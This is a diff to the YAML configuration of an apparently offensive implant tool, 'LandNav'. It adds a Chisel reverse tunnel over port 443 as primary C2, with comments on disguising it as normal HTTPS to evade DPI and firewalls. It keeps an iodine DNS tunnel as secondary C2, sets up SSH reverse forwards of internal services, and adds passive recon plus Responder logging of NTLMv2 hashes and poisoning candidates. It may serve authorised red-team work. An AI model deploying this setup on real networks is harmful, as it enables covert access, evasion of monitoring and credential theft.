@@ -20,7 +20,44 @@ c2:
   # Long-backoff interval after max_retries exhausted (seconds)
   backoff_interval: 300
 
-# ── DNS Tunnel (iodine) — Primary C2 ───────────────────────────
+# ── Chisel HTTPS Reverse Tunnel — Primary C2 ──────────────────
+# Multiplexed reverse port forwarding + SOCKS over a single
+# WebSocket connection on port 443.  Looks like normal HTTPS to
+# DPI — the most reliable egress through enterprise firewalls.
+#
+# chisel server must be running on the C2 server — listener.rc starts
+# it automatically.
+#
+# If forwards are omitted here, the ssh_tunnels.forwards list is
+# reused — configure in one place, both transports honour it.
+chisel:
+  enabled: true
+  # Port the chisel server listens on (c2-server side)
+  server_port: 443
+  # Shared auth — must match chisel server's --auth flag
+  auth: "landnav:changeme"
+  # Use TLS (should be true for port 443 — matches normal HTTPS)
+  tls: true
+  # SOCKS5 proxy port on the C2 server via chisel (0 = disabled)
+  # Separate from Metasploit's SOCKS proxy on :1080 (which routes
+  # through meterpreter sessions).  Chisel SOCKS is a native TCP
+  # tunnel — faster and doesn't starve the meterpreter channel.
+  #   proxychains -q nmap -sT -p- 10.10.240.0/24
+  socks_port: 1081
+  # Reconnection tuning — chisel retries indefinitely by default
+  keepalive: 25s
+  max_retry_interval: 30s
+  # Optional HTTP headers to blend with legitimate traffic
+  # (e.g. match the Host header of a real site behind the same IP)
+  headers: {}
+  #   Host: portal.example.com
+  # Forwards (optional — if empty, inherits ssh_tunnels.forwards):
+  # forwards:
+  #   - local_port: 25100
+  #     remote_port: 5100
+  #     remote_host: 10.10.240.61
+
+# ── DNS Tunnel (iodine) — Secondary C2 ─────────────────────────
 dns_tunnel:
   enabled: true
   # Tunnel domain — NS record for this domain must point to c2.host
@@ -28,6 +65,8 @@ dns_tunnel:
   domain: t.example.com
   # Shared secret between iodine client and iodined server
   password: changeme
+  # Tunnel network (iodined server-side subnet for the dns0 interface)
+  tunnel_net: 10.53.53.1/24
   # Maximum downstream fragment size (auto-detected if 0)
   max_downstream_frag: 0
   # Encoding: NULL, BASE32, BASE64, BASE128, RAW
@@ -42,6 +81,37 @@ meterpreter:
   connect_timeout: 10
   # Retry delay between port attempts (seconds)
   retry_delay: 5
+
+# ── SSH Reverse Tunnels — Service Access ──────────────────────
+# After meterpreter establishes, SSH reverse tunnels are started
+# independently to provide reliable access to internal services.
+# Meterpreter's single-threaded transport starves under web/TLS
+# traffic — SSH tunnels bypass this entirely with native TCP
+# multiplexing over a separate connection.
+#
+# Requires:
+#   1. SSH key pair: deploy script generates keys/tunnel_key{,.pub}
+#   2. Public key in c2-server's authorized_keys (restrict=tunnel-only)
+#   3. SSH binary available on the target (beretta)
+ssh_tunnels:
+  # Path to SSH private key on the target device (beretta)
+  key_path: /opt/pr0t31n/LandNav/keys/tunnel_key
+  # SSH port on the C2 server
+  ssh_port: 22
+  # SSH user on the C2 server
+  ssh_user: root
+  # Port forwards: c2-server_port → target_host:target_port
+  # Each entry creates an SSH -R reverse forward
+  forwards:
+    - local_port: 25100       # c2-server:25100 → beretta:5100 (Vantage)
+      remote_port: 5100
+      remote_host: 10.10.240.61
+    - local_port: 25500       # c2-server:25500 → beretta:5500 (Crucible)
+      remote_port: 5500
+      remote_host: 10.10.240.61
+    - local_port: 28834       # c2-server:28834 → beretta:8834 (Nessus)
+      remote_port: 8834
+      remote_host: 10.10.240.61
 
 # ── Network — Bridge & Discovery ───────────────────────────────
 network:
@@ -93,6 +163,42 @@ network:
     host: ""
     port: 0
 
+# ── Passive Network Reconnaissance ────────────────────────────
+# Runs continuously from Phase 3 onward, collecting network intel
+# with zero active traffic. All output written to logs/recon/.
+passive:
+  enabled: true
+  # How often to flush collected data to disk (seconds)
+  flush_interval: 30
+  # Protocols to capture (all enabled by default):
+  #   ARP, DHCP, DNS, NetBIOS, LLMNR, mDNS, SSDP, 802.1Q, STP
+  #
+  # Output files (in logs/recon/):
+  #   hosts.json       — live host inventory (IP, MAC, hostnames, sources)
+  #   subnets.json     — observed subnets with host counts
+  #   dns_queries.log  — timestamped DNS lookups (who resolves what)
+  #   llmnr.json       — LLMNR/NBT-NS broadcast log (poisoning candidates)
+  #   services.json    — mDNS/SSDP advertised services
+  #   targets.txt      — deduplicated /24 CIDRs for scanning
+
+# ── Responder Analyzer Mode ────────────────────────────────────
+# Runs Responder with -A flag (analyze only — NO POISONING).
+# Passively observes LLMNR/NBT-NS/mDNS/WPAD broadcasts and logs:
+#   - Which hosts broadcast name queries (poisoning targets)
+#   - What names they try to resolve (stale DNS, typos)
+#   - WPAD requests (proxy auto-config poisoning candidates)
+#   - Passively observed authentication attempts (NTLMv2 hashes)
+responder:
+  enabled: true
+  # Override Responder path (auto-detected if empty).
+  # Common locations: /usr/share/responder/Responder.py, /usr/bin/responder
+  path: ""
+  #
+  # Output files (in logs/recon/responder/):
+  #   responder_stdout.log     — raw Responder output
+  #   responder_summary.json   — consolidated findings (hashes, candidates, WPAD)
+  #   *.txt                    — copied from Responder's own logs/ directory
+
 # ── LED Status ─────────────────────────────────────────────────
 led:
   enabled: true
@@ -115,19 +221,3 @@ logging:
   max_size_mb: 50      # Rotate logs after this size
   # Log to console as well (useful for manual testing; disabled in service mode)
   console: true
-
-# ── SSH Reverse Tunnels (added by v0.5.5 deploy) ─────────────
-ssh_tunnels:
-  key_path: /opt/pr0t31n/LandNav/keys/tunnel_key
-  ssh_port: 22
-  ssh_user: root
-  forwards:
-    - local_port: 25100
-      remote_port: 5100
-      remote_host: 10.10.240.61
-    - local_port: 25500
-      remote_port: 5500
-      remote_host: 10.10.240.61
-    - local_port: 28834
-      remote_port: 8834
-      remote_host: 10.10.240.61
